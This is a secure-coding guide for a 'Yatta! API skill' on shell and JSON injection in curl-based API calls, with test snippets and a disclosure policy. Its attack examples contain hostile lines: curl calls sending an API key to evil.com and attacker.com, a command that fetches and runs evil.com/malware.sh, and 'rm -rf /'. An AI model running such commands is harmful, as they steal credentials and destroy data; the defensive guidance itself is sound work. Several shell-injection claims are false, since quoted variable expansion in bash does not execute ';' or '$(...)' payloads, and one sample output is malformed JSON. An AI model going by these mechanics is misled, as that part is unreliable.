# Security Guidelines

## ⚠️ Shell and JSON Injection Vulnerabilities

**The Yatta! API skill requires careful input handling to prevent shell and JSON injection attacks.**

### The Problem

When constructing API calls with user-provided or variable data, **direct string interpolation creates critical vulnerabilities**.

---

## Vulnerability 1: Shell Injection via URL Path Parameters

### Unsafe Pattern

```bash
TASK_ID="user-controlled-value"
curl "$YATTA_API_URL/tasks/$TASK_ID" ...
```

### Attack Scenario

```bash
# Attacker sets TASK_ID to:
TASK_ID="123; curl evil.com/steal?key=$YATTA_API_KEY"

# Result: API key exfiltration
# The shell executes:
curl "$YATTA_API_URL/tasks/123
curl evil.com/steal?key=yatta_abc123..."
```

### Safe Pattern

```bash
# URL-encode the task ID to prevent shell injection
TASK_ID_ENCODED=$(printf %s "$TASK_ID" | jq -sRr @uri)
curl "$YATTA_API_URL/tasks/$TASK_ID_ENCODED" ...
```

**Why this is safe:**
- `jq -sRr @uri` URL-encodes the entire string
- Shell metacharacters like `;`, `|`, `&`, `$()` become `%3B`, `%7C`, `%26`, etc.
- No command execution possible

---

## Vulnerability 2: JSON Injection via Request Body

### Unsafe Pattern

```bash
SUBJECT="user-controlled-value"
curl -d "{\"subject\": \"$SUBJECT\"}" ...
```

### Attack Scenario

```bash
# Attacker sets SUBJECT to:
SUBJECT='test", "archived": true, "priority": "low'

# Result: Arbitrary JSON injection
# The payload becomes:
{"subject": "test", "archived": true, "priority": "low"}
# Instead of:
{"subject": "test\", \"archived\": true, \"priority\": \"low"}
```

### Safe Pattern

```bash
# Use jq to build JSON safely
PAYLOAD=$(jq -n --arg subject "$SUBJECT" '{subject: $subject}')
curl -d "$PAYLOAD" ...
```

**Why this is safe:**
- `jq -n --arg` properly escapes strings
- Quote characters are escaped: `"` becomes `\"`
- JSON structure cannot be modified
- No injection possible

---

## Vulnerability 3: Command Substitution

### Attack Scenario

```bash
# Attacker sets TASK_ID to:
TASK_ID='$(rm -rf /)'

# Or:
TASK_ID='`curl evil.com/malware.sh | sh`'

# Result: Command execution via subshell
```

### Safe Pattern

```bash
# URL encoding prevents command substitution
TASK_ID_ENCODED=$(printf %s "$TASK_ID" | jq -sRr @uri)
# Result: $(...) becomes %24%28...%29 (harmless string)
```

---

## Real-World Impact Examples

### Example 1: API Key Exfiltration

```bash
# Unsafe code
TASK_ID="123; curl attacker.com/log?key=$YATTA_API_KEY"
curl "$YATTA_API_URL/tasks/$TASK_ID"

# What happens:
# 1. First curl gets task 123
# 2. Second curl sends your API key to attacker
# 3. Attacker gains full access to your Yatta! account
```

### Example 2: Task Manipulation

```bash
# Unsafe code
TITLE='Innocent", "archived": true, "status": "done'
curl -d "{\"title\": \"$TITLE\"}"

# Intended: Create task with weird title
# Actual result: Task is marked as done and archived immediately
```

### Example 3: Privilege Escalation

```bash
# Unsafe code
PROJECT_NAME='Admin", "is_admin": true, "can_delete_all": true'
curl -d "{\"name\": \"$PROJECT_NAME\"}"

# If API doesn't properly validate, attacker might gain elevated privileges
```

---

## Safe Coding Patterns

### Pattern 1: Use jq for JSON Construction

**Always:**
```bash
PAYLOAD=$(jq -n \
  --arg title "$TITLE" \
  --arg priority "$PRIORITY" \
  '{title: $title, priority: $priority}')

curl -d "$PAYLOAD" ...
```

**Never:**
```bash
curl -d "{\"title\": \"$TITLE\", \"priority\": \"$PRIORITY\"}" ...
```

### Pattern 2: URL-Encode Path Parameters

**Always:**
```bash
TASK_ID_ENCODED=$(printf %s "$TASK_ID" | jq -sRr @uri)
curl "$YATTA_API_URL/tasks/$TASK_ID_ENCODED"
```

**Never:**
```bash
curl "$YATTA_API_URL/tasks/$TASK_ID"
```

### Pattern 3: Use Wrapper Functions

**Best practice:**
```bash
# Source the safe wrapper library
source scripts/yatta-safe-api.sh

# Use safe functions
yatta_create_task "Finish report" "high"
yatta_update_task "$TASK_ID" "status" "done"
```

---

## Testing for Vulnerabilities

### Test 1: Shell Injection Detection

```bash
# Test with a malicious TASK_ID
TASK_ID='123; echo "VULNERABLE"'

# Unsafe (will print "VULNERABLE"):
curl "$YATTA_API_URL/tasks/$TASK_ID"

# Safe (will not print anything):
TASK_ID_ENCODED=$(printf %s "$TASK_ID" | jq -sRr @uri)
curl "$YATTA_API_URL/tasks/$TASK_ID_ENCODED"
# URL becomes: .../tasks/123%3B%20echo%20%22VULNERABLE%22
```

### Test 2: JSON Injection Detection

```bash
# Test with a malicious title
TITLE='test", "archived": true'

# Unsafe (will inject archived field):
UNSAFE_PAYLOAD="{\"title\": \"$TITLE\"}"
echo "$UNSAFE_PAYLOAD"
# Output: {"title": "test", "archived": true"}

# Safe (will escape quotes):
SAFE_PAYLOAD=$(jq -n --arg title "$TITLE" '{title: $title}')
echo "$SAFE_PAYLOAD"
# Output: {"title":"test\", \"archived\": true"}
```

### Test 3: Command Substitution Detection

```bash
# Test with command substitution
TASK_ID='$(whoami)'

# Unsafe (will execute whoami):
curl "$YATTA_API_URL/tasks/$TASK_ID"

# Safe (whoami is not executed):
TASK_ID_ENCODED=$(printf %s "$TASK_ID" | jq -sRr @uri)
curl "$YATTA_API_URL/tasks/$TASK_ID_ENCODED"
# URL becomes: .../tasks/%24%28whoami%29
```

---

## Validation Checklist

Before running ANY API call with variable data:

- [ ] Are all path parameters URL-encoded with `jq -sRr @uri`?
- [ ] Are all JSON payloads built with `jq -n --arg`?
- [ ] Am I using safe wrapper functions from `scripts/yatta-safe-api.sh`?
- [ ] Have I tested with malicious input (`;`, `"`, `$()`, etc.)?
- [ ] Does the code review pass without direct string interpolation?

---

## Additional Resources

- **Safe wrapper functions:** `scripts/yatta-safe-api.sh`
- **jq manual:** https://stedolan.github.io/jq/manual/
- **OWASP Command Injection:** https://owasp.org/www-community/attacks/Command_Injection
- **OWASP JSON Injection:** https://owasp.org/www-community/vulnerabilities/JSON_Injection

---

## Reporting Security Issues

If you discover a security vulnerability in this skill:

1. **Do not** create a public GitHub issue
2. Email: security@yattadone.com (or skill maintainer)
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if known)

**Responsible disclosure timeline:**
- Day 0: Report received, acknowledged within 24 hours
- Day 1-7: Investigation and fix development
- Day 7-14: Testing and validation
- Day 14+: Public disclosure after patch release

---

*Last updated: 2026-02-28*
*Related: VirusTotal finding - Shell and JSON injection vulnerability*
